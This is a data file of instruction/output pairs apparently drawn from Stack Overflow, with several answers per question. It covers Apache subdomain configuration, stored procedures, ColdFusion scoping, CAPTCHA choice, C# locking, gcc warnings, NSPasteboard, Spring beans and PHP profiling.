{"instruction": "I have a wildcard subdomain enabled and dynamically parse the URL by passing it as-is to my index.php (ex. somecity.domain.com).  \nNow, I wish to create a few subdomains that are static where I can install different application and not co-mingle with my current one (ex. blog.domain.com).\nMy .htaccess currently reads:\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n\nCan I manipulate this .htaccess to achieve what I need? Can it be done through Apache?", "output": "I'm not sure I understand completely what you need to accomplish, but it might helpful to setup virtual domains within your Apache configuration file. You can map them to folders on the drive with different applications installed. Each virtual domain is treated much like a root directory. I have my development environment setup locally on my Windows machine a lot like this:\nNameVirtualHost *:80\n\n# Begin virtual host directives.\n\n<VirtualHost *:80>\n\n# myblog.com virtual host.\n\nServerAdmin webmaster@myblog.com\nDocumentRoot \"c:/apache_www/myblog.com/www\"\nServerName myblog.com\nServerAlias *.myblog.com\nErrorLog \"c:/apache_www/myblog.com/logs/log\"\nScriptAlias /cgi-bin/ \"c:/apache_www/myblog.com/cgi-bin/\"\n\n<Directory \"c:/apache_www/myblog.com/www\">\n    Options Indexes FollowSymLinks\n    AllowOverride All\n    Order allow,deny\n    Allow from all\n</Directory>\n\n</VirtualHost>\n\nIf this does not help get you on the right track, then try researching the VirtualHost directive to come up with a solution. I find trying to do all this in an .htaccess to be cumbersome and difficult to manage."}
{"instruction": "I have a wildcard subdomain enabled and dynamically parse the URL by passing it as-is to my index.php (ex. somecity.domain.com).  \nNow, I wish to create a few subdomains that are static where I can install different application and not co-mingle with my current one (ex. blog.domain.com).\nMy .htaccess currently reads:\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n\nCan I manipulate this .htaccess to achieve what I need? Can it be done through Apache?", "output": "Your .htaccess does nothing useful, as Apache is probably configured with DirectoryIndex index.php. Well, it does move domain.com/a  to domain.com/index.php, but I doubt that is what you want.\nYour wildcard virtualhost works because you probably have ServerAlias *.domain.com in your configuration, or a single virtualhost and DNS pointing to the address of your server. (When you have a single virtualhost, it shows up for any request, and the first listed virtualhost is the default one)\nYou have to create new VirtualHosts for the static domains, leaving the default one as, well, the default one :)\nCheck these tutorials that explain it all."}
{"instruction": "My current view is no, prefer Transact SQL stored procedures because they are a lighter weight and (possibly) higher performing option, while CLR procedures allow developers to get up to all sorts of mischief.\nHowever recently I have needed to debug some very poorly written TSQL stored procs.  As usual I found many of the problems due to the original developer developer having no real TSQL experience, they were  ASP.NET / C# focused.\nSo, using CLR procedures would firstly provide a much more familiar toolset to this type of developer, and secondly, the debugging and testing facilities are more powerful (ie Visual Studio instead of SQL Management Studio).  \nI'd be very interested in hearing your experience as it's seems it is not a simple choice.", "output": "Aside from the file system access (where CLR procs has a very pronounced advantage) I would use T-SQL procs.  If you have especially complex calculations you could possibly put that piece into a CLR function and call this from within your proc (udf's are where I've found the CLR integration really shines).  Then you get the benefits of the CLR integration for that particular part of your task but keep as much of your stored proc logic in the DB as you can."}
{"instruction": "In a ColdFusion Component (CFC), is it necessary to use fully qualified names for variables-scoped variables?\nAm I going to get myself into trouble if I change this:\n<cfcomponent>\n    <cfset variables.foo = \"a private instance variable\">\n\n    <cffunction name = \"doSomething\">\n    \t<cfset var bar = \"a function local variable\">\n    \t<cfreturn \"I have #variables.foo# and #bar#.\">\n    </cffunction>\n</cfcomponent>\n\nto this?\n<cfcomponent>\n    <cfset foo = \"a private instance variable\">\n\n    <cffunction name = \"doSomething\">\n    \t<cfset var bar = \"a function local variable\">\n    \t<cfreturn \"I have #foo# and #bar#.\">\n    </cffunction>\n</cfcomponent>", "output": "It won't matter to specify \"variables\" when you create the variable, because foo will be placed in the variables scope by default; but it will matter when you access the variable.\n<cfcomponent>\n    <cfset foo = \"a private instance variable\">\n\n    <cffunction name=\"doSomething\">\n    \t<cfargument name=\"foo\" required=\"yes\"/>\n        <cfset var bar = \"a function local variable\">\n        <cfreturn \"I have #foo# and #bar#.\">\n    </cffunction>\n\n    <cffunction name=\"doAnotherThing\">\n    \t<cfargument name=\"foo\" required=\"yes\"/>\n        <cfset var bar = \"a function local variable\">\n        <cfreturn \"I have #variables.foo# and #bar#.\">\n    </cffunction>\n\n</cfcomponent>\n\ndoSomething(\"args\") returns \"I have args and a function local variable\"\ndoAnotherThing(\"args\") returns \"I have a private instance of a variable and a function local variable.\""}
{"instruction": "In a ColdFusion Component (CFC), is it necessary to use fully qualified names for variables-scoped variables?\nAm I going to get myself into trouble if I change this:\n<cfcomponent>\n    <cfset variables.foo = \"a private instance variable\">\n\n    <cffunction name = \"doSomething\">\n    \t<cfset var bar = \"a function local variable\">\n    \t<cfreturn \"I have #variables.foo# and #bar#.\">\n    </cffunction>\n</cfcomponent>\n\nto this?\n<cfcomponent>\n    <cfset foo = \"a private instance variable\">\n\n    <cffunction name = \"doSomething\">\n    \t<cfset var bar = \"a function local variable\">\n    \t<cfreturn \"I have #foo# and #bar#.\">\n    </cffunction>\n</cfcomponent>", "output": "The short answer to your question is that no, you will probably not run into trouble attempting to do that. Outside the context of a UDF (even still inside a CFC), an un-scoped set statement implies the variables scope.\nIn addition, in a CFC, the Variables scope is available to all of its functions; it is sort of the global scope within that CFC -- similar to the \"this\" scope, except variables scope is akin to \"private\" variables, whereas the this scope is akin to public variables.\nTo test this, create test.cfc:\n<cfcomponent>\n    <cfset foo = \"bar\" />\n    <cffunction name=\"dumpit\" output=\"true\">\n        <cfdump var=\"#variables#\" label=\"cfc variables scope\">\n        <cfdump var=\"#this#\" label=\"cfc this scope\">\n    </cffunction>\n</cfcomponent>\n\nand a page to test it, test.cfm:\n<cfset createObject(\"component\", \"test\").dumpit() />\n\nAnd the results will be:\n\n\nNow, to address another problem I see in your example code...\nIn CF, all User Defined Functions have a special un-named scope commonly referred to as the \"var\" scope. If you do the following inside a UDF:\n<cfset foo = \"bar\" />\n\nThen you are telling CF to put that variable into the var scope.\nTo compound things a bit, you can run into problems (variable values changing when you weren't expecting them to) when you are not using the var scope in your inline UDFs.\nSo the rule of thumb is to always, Always, ALWAYS, ALWAYS var-scope your function-internal variables (including query names). There is a tool called varScoper that will assist you in finding variables that need to be var-scoped. Last I checked it wasn't perfect, but it's definitely a start.\nHowever, it is a bad idea to reference (display/use) variables without a scope (obviously excepting var-scoped variables, as you can't specify the scope to read from) in CFCs or even on your standard CFM pages. As of CF7, there were 9 scopes that were checked in a specific order when you read a variable without specifying the scope, first match wins. With CF8, there could be more scopes in that list, I haven't checked. When you do this, you run the risk of getting a value from one scope when you are expecting it from another; which is a nightmare to debug... I assure you. ;)\nSo in short: implying a variable's scope (on set) is not a terrible idea (though I usually specify it anyway); but inferring variable's scope (on read) is asking for trouble."}
{"instruction": "Of all the forms of CAPTCHA available, which one is the \"least crackable\" while remaining fairly human readable?", "output": "I believe that CAPTCHA is dying. If someone really wants to break it, it will be broken. I read (somewhere, don't remember where) about a site that gave you free porn in exchange for answering CAPTCHAs to they can be rendered obsolete by bots. So, why bother?"}
{"instruction": "Of all the forms of CAPTCHA available, which one is the \"least crackable\" while remaining fairly human readable?", "output": "I agree with Thomas. Captcha is on its way out. But if you must use it, reCAPTCHA  is a pretty good provider with a simple API."}
{"instruction": "Of all the forms of CAPTCHA available, which one is the \"least crackable\" while remaining fairly human readable?", "output": "This information is hard to really know because I believe a CAPTCHA gets broken long before anybody knows about it.  There is economic incentive for those that break them to keep it quiet.\nI used to work with a guy whose job revolved mostly around breaking CAPTCHA's and I can tell you the one giving them fits currently is reCAPTCHA.\nNow, does that mean it will forever, call me skeptical."}
{"instruction": "Of all the forms of CAPTCHA available, which one is the \"least crackable\" while remaining fairly human readable?", "output": "I believe that CAPTCHA is dying. If someone really wants to break it, it will be broken. I read (somewhere, don't remember where) about a site that gave you free porn in exchange for answering CAPTCHAs to they can be rendered obsolete by bots. So, why bother?\n\nAnyone who really wants to break this padlock can use a pair of bolt cutters, so why bother with the lock?\nAnyone who really wants to steal this car can drive up with a tow truck, so why bother locking my car?\nAnyone who really wants to open this safe can cut it open with an oxyacetylene torch, so why bother putting things in the safe?\nBecause using the padlock, locking your car, putting valuables in a safe, and using a CAPTCHA weeds out a large spectrum of relatively unsophisticated or unmotivated attackers.  The fact that it doesn't stop sophisticated, highly motivated attackers doesn't mean that it doesn't work at all.  Using a CAPTCHA isn't going to stop all spammers, but it's going to tremendously reduce the amount that requires filtering or manual intervention.  \nHeck look at the lame CAPTCHA that Jeff uses on his blog.  Even a wimpy barrier like that still provides a lot of protection."}
{"instruction": "Of all the forms of CAPTCHA available, which one is the \"least crackable\" while remaining fairly human readable?", "output": "As far as I know, the Google's one is the best that there is. It hasn't been broken by computer programs yet. What I know that the crackers have been doing is to copy the image and then send it to many phishing websites where humans solve them to enter those websites."}
{"instruction": "Of all the forms of CAPTCHA available, which one is the \"least crackable\" while remaining fairly human readable?", "output": "If you're a small enough site, no one would bother.\nIf you're still looking for a CAPTCHA, I like tEABAG_3D by the OCR Research Team. It's complicated to break and uses your 3D vision. Plus, it being developed by people who break CAPTCHAs for fun."}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "Generally speaking if your application is single threaded, you're not going to get much use out of the lock statement. Not knowing your application exactly, I don't know if they're useful or not - but I suspect not. Further, if you're application is using lock everywhere I don't know that I would feel all that confident about it working in a multi-threaded  environment anyways - did the original developer actually know how to develop multi-threaded code, or did they just add lock statements everywhere in the vague hope that that would do the trick?"}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "There is no point in having locks in the app if there is only one thread and yes, it is a performance hit although it does take a fair number of calls for that hit to stack up into something significant."}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "You can have performance issues with locking variables, but normally, you'd construct your code to minimize the lengths of time that are spent inside a 'locked' block of code.\nAs far as removing the locks. It'll depend on what exactly the code is doing. Even though it's single threaded, if your object is implemented as a Singleton, it's possible that you'll have multiple clients using an instance of it (in memory, on a server) at the same time.."}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "Yes, there will be some performance penalty when using lock but it is generally neglible enough to not matter.\nUsing locks (or any other mutual-exclusion statement or construct) is generally only needed in multi-threaded scenarios where multiple threads (either of your own making or from your caller) have the opportunity to interact with the object and change the underlying state or data maintained. For example, if you have a collection that can be accessed by multiple threads you don't want one thread changing the contents of that collection by removing an item while another thread is trying to read it."}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "Lock(token) is only used to mark one or more blocks of code that should not run simultaneously in multiple threads. If your application is single-threaded, it's protecting against a condition that can't exist.\nAnd locking does invoke a performance hit, adding instructions to check for simultaneous access before code is executed. It should only be used where necessary."}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "lock should be used around the code that modifies shared state, state that is modified by other threads concurrently, and those other treads must take the same lock. \nA lock is actually a memory access serializer, the threads (that take the lock) will wait on the lock to enter until the current thread exits the lock, so memory access is serialized.\nTo answer you question lock is not needed in a single threaded application, and it does have performance side effects. because locks in C# are based on kernel sync objects and every lock you take creates a transition to kernel mode from user mode. \nIf you're interested in multithreading performance a good place to start is MSDN threading guidelines"}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "When should the lock be used?\n\nA lock should be used to protect shared resources in multithreaded code.  Not for anything else.\n\nBut is it necessary when the application does not spin off any other threads?\n\nAbsolutely not.  It's just a time waster.  However do be sure that you're not implicitly using system threads.  For example if you use asynchronous I/O you may receive callbacks from a random thread, not your original thread.\n\nIs there performance issues with using lock?\n\nYes.  They're not very big in a single-threaded application, but why make calls you don't need?\n\n...if that is a good design pattern to follow in the future[?]\n\nLocking everything willy-nilly is a terrible design pattern.  If your code is cluttered with random locking and then you do decide to use a background thread for some work, you're likely to run into deadlocks.  Sharing a resource between multiple threads requires careful design, and the more you can isolate the tricky part, the better."}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "Bear in mind that there might be reasons why your application is not as single-threaded as you think.  Async I/O in .NET may well call-back on a pool thread, for example, as do some of the various timer classes (not the Windows Forms Timer, though)."}
{"instruction": "Of all the forms of CAPTCHA available, which one is the \"least crackable\" while remaining fairly human readable?", "output": "It doesn't matter if captchas are broken or not now -- there are Indian firms that do nothing but process captchas. I'm with the rest of the group in saying that Captchas are on their way out."}
{"instruction": "In a LotusScript Agent that is being run via WebQueryOpen, how do you get the name of the current server?", "output": "Set s = New NotesSession\nSet db = s.CurrentDatabase\n\nIf db.Server <> \"\" Then\n  Set sName = New NotesName(db.Server)\nElse\n  Set sName = New NotesName(s.Username)\nEnd If"}
{"instruction": "So I'm working on an exceedingly large codebase, and recently upgraded to gcc 4.3, which now triggers this warning:\n\nwarning: deprecated conversion from string constant to \u2018char*\u2019\n\nObviously, the correct way to fix this is to find every declaration like\nchar *s = \"constant string\";\n\nor function call like:\nvoid foo(char *s);\nfoo(\"constant string\");\n\nand make them const char pointers.  However, that would mean touching 564 files, minimum, which is not a task I wish to perform at this point in time.  The problem right now is that I'm running with -werror, so I need some way to stifle these warnings.  How can I do that?", "output": "I believe passing -Wno-write-strings to gcc will suppress this warning."}
{"instruction": "So I'm working on an exceedingly large codebase, and recently upgraded to gcc 4.3, which now triggers this warning:\n\nwarning: deprecated conversion from string constant to \u2018char*\u2019\n\nObviously, the correct way to fix this is to find every declaration like\nchar *s = \"constant string\";\n\nor function call like:\nvoid foo(char *s);\nfoo(\"constant string\");\n\nand make them const char pointers.  However, that would mean touching 564 files, minimum, which is not a task I wish to perform at this point in time.  The problem right now is that I'm running with -werror, so I need some way to stifle these warnings.  How can I do that?", "output": "Check out gcc's Diagnostic Pragma support, and the list of -W warning options (changed: new link to warning options).\nFor gcc, you can use #pragma warning directives like explained here."}
{"instruction": "Is there a way to unfilter an NSPasteboard for what the source application specifically declared it would provide?\nI'm attempting to serialize pasteboard data in my application.  When another application places an RTF file on a pasteboard and then I ask for the available types, I get eleven different flavors of said RTF, everything from the original RTF to plain strings to dyn.* values.  \nSaving off all that data into a plist or raw data on disk isn't usually a problem as it's  pretty small, but when an image of any considerable size is placed on the pasteboard, the resulting output can be tens of times larger than the source data (with multiple flavors of TIFF and PICT data being made available via filtering).\nI'd like to just be able to save off what the original app made available if possible.\n\nJohn, you are far more observant than myself or the gentleman I work with who's been doing Mac programming since dinosaurs roamed the earth.  Neither of us ever noticed the text you highlighted... and I've not a clue why.  Starting too long at the problem, apparently.\nAnd while I accepted your answer as the correct answer, it doesn't exactly answer my original question.  What I was looking for was a way to identify flavors that can become  other flavors simply by placing them on the pasteboard AND to know which of these types were originally offered by the provider.  While walking the types list will get me the preferred order for the application that provided them, it won't tell me which ones I can safely ignore as they'll be recreated when I refill the pasteboard later.\nI've come to the conclusion that there isn't a \"good\" way to do this.  [NSPasteboard declaredTypesFromOwner] would be fabulous, but it doesn't exist.", "output": "You may be able to get some use out of +[NSPasteboard typesFilterableTo:]. I'm picturing a snippet like this:\nNSArray *allTypes = [pb types];\nNSAssert([allTypes count] > 0, @\"expected at least one type\");\n\n// We always require the first declared type, as a starting point.\nNSMutableSet *requiredTypes = [NSMutableSet setWithObject:[allTypes objectAtIndex:0]];\n\nfor (NSUInteger index = 1; index < [allTypes count]; index++) {\n    NSString *aType = [allTypes objectAtIndex:index];\n    NSSet *filtersFrom = [NSSet setWithArray:[NSPasteboard typesFilterableTo:aType]];\n\n    // If this type can't be re-created with a filter we already use, add it to the\n    // set of required types.\n    if (![requiredTypes intersectsSet:filtersFrom])\n        [requiredTypes addObject:aType];\n}\n\nI'm not sure how effective this would be at picking good types, however."}
{"instruction": "So I'm working on an exceedingly large codebase, and recently upgraded to gcc 4.3, which now triggers this warning:\n\nwarning: deprecated conversion from string constant to \u2018char*\u2019\n\nObviously, the correct way to fix this is to find every declaration like\nchar *s = \"constant string\";\n\nor function call like:\nvoid foo(char *s);\nfoo(\"constant string\");\n\nand make them const char pointers.  However, that would mean touching 564 files, minimum, which is not a task I wish to perform at this point in time.  The problem right now is that I'm running with -werror, so I need some way to stifle these warnings.  How can I do that?", "output": "If it's an active code base, you might still want to upgrade the code base. Of course, performing the changes manually isn't feasible but I believe that this problem could be solved once and for all by one single sed command. I haven't tried it, though, so take the following with a grain of salt.\nfind . -exec sed -E -i .backup -n \\\n    -e 's/char\\s*\\*\\s*(\\w+)\\s*= \"/char const* \\1 = \"/g' {} \\;\n\nThis might not find all places (even not considering function calls) but it would alleviate the problem and make it possible to perform the few remaining changes manually."}
{"instruction": "This is something I've pseudo-solved many times and never quite found a solution. That's stuck with me. The problem is to come up with a way to generate N colors, that are as distinguishable as possible where N is a parameter.", "output": "It would be best to find colors maximally distant in a \"perceptually uniform\" colorspace, e.g. CIELAB (using Euclidean distance between L*, a*, b* coordinates as your distance metric) and then converting to the colorspace of your choice.  Perceptual uniformity is achieved by tweaking the colorspace to approximate the non-linearities in the human visual system."}
{"instruction": "I have a wildcard subdomain enabled and dynamically parse the URL by passing it as-is to my index.php (ex. somecity.domain.com).  \nNow, I wish to create a few subdomains that are static where I can install different application and not co-mingle with my current one (ex. blog.domain.com).\nMy .htaccess currently reads:\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n\nCan I manipulate this .htaccess to achieve what I need? Can it be done through Apache?", "output": "I don't know if you have cpanel installed on your host, but i was able to do this by adding a new subdomain '*' and then sending all that traffic to a particular subdomain,\nex *.domain.com -> master.domain.com. Then you can read out which url you are at in master.domain.com and go from there."}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "you can also try using the register_tick_function function in php. which tells php to call a certain function periodcally through out your code. You could then keep track of which function is currently running and the amount of time between calls. then you could see what's taking the most time. \nhttp://www.php.net/register_tick_function"}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "See the question about 'Mutex' in C#. And then look at these two questions regarding use of the 'lock(Object)' statement specifically."}
{"instruction": "I'd like to create a spring bean that holds the value of a double.     Something like:\n<bean id=\"doubleValue\" value=\"3.7\"/>", "output": "Why don't you just use a Double?"}
{"instruction": "I found a bug in the Contains statement in Linq (not sure if it is really in Linq or Linq to SQL) and want to know if anyone else has seen this and if there is a fix or workaround.\nIf the querysource you do the contains with has more than 10 items in it, it does not pass the items correctly to the SQL query. It is hard to explain what it does, an example will show it best.\nIf you look at the raw query, the parameters look like this:\n@P0 = 'aaa'\n@P1 = 'bbb'\n@P2 = 'ccc'\n... [@P3 through @P9]\n@P10 = '111'\n@P11 = '222'\n... [@p12 through @P19]\n@P20 = 'sss'\n... [@P21 through @P99]\n@P100 = 'qqq'\n\nwhen the values are passed into the final query (all parameters resolved) it has resolved the parameters as if these were the values passed:\n@P0 = 'aaa'\n@P1 = 'bbb'\n@P2 = 'ccc'\n...\n@P10 = 'bbb'0\n@P11 = 'bbb'1\n...\n@P20 = 'ccc'0\n...\n@P100 = 'bbb'00\n\nSo it looks like the parameter resolving looks at the first digit only after the @P and resolves that, then adds on anything left at the end of the parameter name.\nAt least that is what the Sql Server Query Visualizer plugin to Visual Studio shows the query doing.\nReally strange.\nSo if any one has advice please share. Thanks!\nUpdate:\nI have rewritten the original linq statement to where I now use a join instead of the Contains, but would still like to know if there is a way around this issue.", "output": "The more I look at it, and after running more tests, I'm thinking the bug may be in the Sql Server Query Visualizer plugin for Visual Studio, not actually in Linq to SQL itself. So it is not nearly as bad a situation as I thought - the query will return the right results, but you can't trust what the Visualizer is showing. Not great, but better than what I thought was going on."}
{"instruction": "I'd like to create a spring bean that holds the value of a double.     Something like:\n<bean id=\"doubleValue\" value=\"3.7\"/>", "output": "Declare it like this\n<bean id=\"doubleValue\" class=\"java.lang.Double\">\n    <constructor-arg index=\"0\" value=\"3.7\"/>\n</bean>\n\nAnd use like this\n<bean id=\"someOtherBean\" ...>\n    <property name=\"value\" ref=\"doubleValue\"/>\n</bean>"}
{"instruction": "I have been hearing the podcast blog for a while, I hope I dont break this. \nThe question is this: I have to insert an xml to a database. This will be for already defined tables and fields. So what is the best way to accomplish this? So far I am leaning toward programatic. I have been seeing varios options, one is Data Transfer Objects (DTO), in the SQL Server there is the sp_xml_preparedocument that is used to get transfer XMLs to an object and throught code. \nI am using CSharp and SQL Server 2005. The fields are not XML fields, they are the usual SQL datatypes.", "output": "If your XML conforms to a particular XSD schema, you can look into using the \"xsd.exe\" command line tool to generate C# object classes that you can bind the XML to, and then form your insert statements using the properties of those objects: MSDN XSD Doc"}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "I don't know that they are faster. I like using ORM for data access (to not re-invent the wheel) but I realize that's not always a viable option. \nFrans Bouma has a good article on this subject : http://weblogs.asp.net/fbouma/archive/2003/11/18/38178.aspx"}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "Stored procs are great for cases where the SQL code is run frequently because the database stores it tokenized in memory.  If you repeatedly ran the same code outside of a stored proc, you will likey incur a performance hit from the database reparsing the same code over and over.\nI typically frequently called code as a stored proc or as a SqlCommand (.NET) object and execute as many times as needed."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "Read Frans Bouma's excellent post (if a bit biased) on that."}
{"instruction": "In a ColdFusion Component (CFC), is it necessary to use fully qualified names for variables-scoped variables?\nAm I going to get myself into trouble if I change this:\n<cfcomponent>\n    <cfset variables.foo = \"a private instance variable\">\n\n    <cffunction name = \"doSomething\">\n    \t<cfset var bar = \"a function local variable\">\n    \t<cfreturn \"I have #variables.foo# and #bar#.\">\n    </cffunction>\n</cfcomponent>\n\nto this?\n<cfcomponent>\n    <cfset foo = \"a private instance variable\">\n\n    <cffunction name = \"doSomething\">\n    \t<cfset var bar = \"a function local variable\">\n    \t<cfreturn \"I have #foo# and #bar#.\">\n    </cffunction>\n</cfcomponent>", "output": "After reading your answers here's what I'm thinking:\nYes, it's safe. In general, it's not necessary or useful to explicitly specify the variables scope. It just adds clutter to an already verbose language.\nGranted, there is one minor exception, as Soldarnal pointed out, where qualifying a variables-scoped variable is required. That is if you have a function local variable with the same name. (But you probably shouldn't do that anyway.)"}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "In many cases, stored procedures are actually slower because they're more genaralized. While stored procedures can be highly tuned, in my experience there's enough development and institutional friction that they're left in place once they work, so stored procedures often tend to return a lot of columns \"just in case\" - because you don't want to deploy a new stored procedure every time you change your application. An OR/M, on the other hand, only requests the columns the application is using, which cuts down on network traffic, unnecessary joins, etc."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "All I can speak to is SQL server. In that platform, stored procedures are lovely because the server stores the execution plan, which in most cases speeds up performance a good bit. I say \"in most cases\", because if the SP has widely varying paths of execution you might get suboptimal performance. However, even in those cases, some enlightened refactoring of the SPs can speed things up."}
